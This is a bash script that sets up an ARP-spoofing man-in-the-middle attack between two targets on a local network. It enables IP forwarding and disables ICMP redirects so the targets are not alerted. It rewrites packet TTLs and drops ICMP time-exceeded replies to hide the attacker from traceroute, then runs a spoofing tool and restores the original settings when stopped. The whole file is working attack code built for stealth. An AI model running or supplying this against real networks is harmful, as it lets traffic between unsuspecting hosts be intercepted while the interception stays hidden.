#!/bin/bash

#--------------------------------------------------
# Configuration
#--------------------------------------------------

DEVICE=""
IP1=""
IP2=""
MAC1=""
MAC2=""
SPOOF="acp -v -u -q -r 6000 -i $DEVICE $IP1 $IP2 $MAC1 $MAC2"

# Protocols that are NOT forwarded
declare -a no_forward=()

#--------------------------------------------------
# Save current settings
#--------------------------------------------------

MANGLE_RULES=`mktemp`
FILTER_RULES=`mktemp`
FORWARD=`cat /proc/sys/net/ipv4/ip_forward`
REDIRECT_SEND_ALL=`cat /proc/sys/net/ipv4/conf/all/send_redirects`
REDIRECT_SEND_DEV=`cat /proc/sys/net/ipv4/conf/$DEVICE/send_redirects`
REDIRECT_ACCEPT_ALL=`cat /proc/sys/net/ipv4/conf/all/accept_redirects`
REDIRECT_ACCEPT_DEV=`cat /proc/sys/net/ipv4/conf/$DEVICE/accept_redirects`

iptables-save -t mangle > $MANGLE_RULES
iptables-save -t filter > $FILTER_RULES

#--------------------------------------------------
# Environment setup
#--------------------------------------------------
iptables -t mangle -F

# Make sure we don't send out icmp redirects. We don't want to inform
# our targets that our route is not the most efficient one :)
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/$DEVICE/send_redirects

# We also don't want to take any routing suggestions
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/$DEVICE/accept_redirects

# enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Drop unforwarded protocols
for nf in "${no_forward[@]}"
do
    iptables -t filter -A FORWARD -p $nf -s $IP1 -j DROP
    iptables -t filter -A FORWARD -p $nf -s $IP2 -j DROP
done


# Hide from traceroute. This assumes a star topology.
#
# Traceroute T1 -> T2
# 2. T1   ->   router   ->   attacker   ->   router   ->   T2
#     ^           ^              ^             ^            ^
#   ttl=2     ttl=2-1=1     ttl=1+2-1=2     ttl=2-1=1   ttl=1-1=0
#
for ((i = 1; i <= 60; i++)) do
    iptables -t mangle -A PREROUTING -p udp -m ttl --ttl-eq $i -j TTL --ttl-set $((i+2));
done

iptables -t filter -A OUTPUT -p icmp --icmp-type 11 -j DROP

#--------------------------------------------------
# Set cleanup on Ctrl-c
#--------------------------------------------------
CLEANED_UP=false

function cleanup() {
    if ! $CLEANED_UP; then
        iptables-restore < $MANGLE_RULES
        iptables-restore < $FILTER_RULES

        echo $FORWARD > /proc/sys/net/ipv4/ip_forward
        echo $REDIRECT_ACCEPT_ALL > /proc/sys/net/ipv4/conf/all/accept_redirects
        echo $REDIRECT_ACCEPT_DEV > /proc/sys/net/ipv4/conf/$DEVICE/accept_redirects
        echo $REDIRECT_SEND_ALL > /proc/sys/net/ipv4/conf/all/send_redirects
        echo $REDIRECT_SEND_DEV > /proc/sys/net/ipv4/conf/$DEVICE/send_redirects

        rm $MANGLE_RULES
        rm $FILTER_RULES

        CLEANED_UP=true
    fi
}

trap cleanup INT

#--------------------------------------------------
# Run spoofer
#--------------------------------------------------

$SPOOF

cleanup
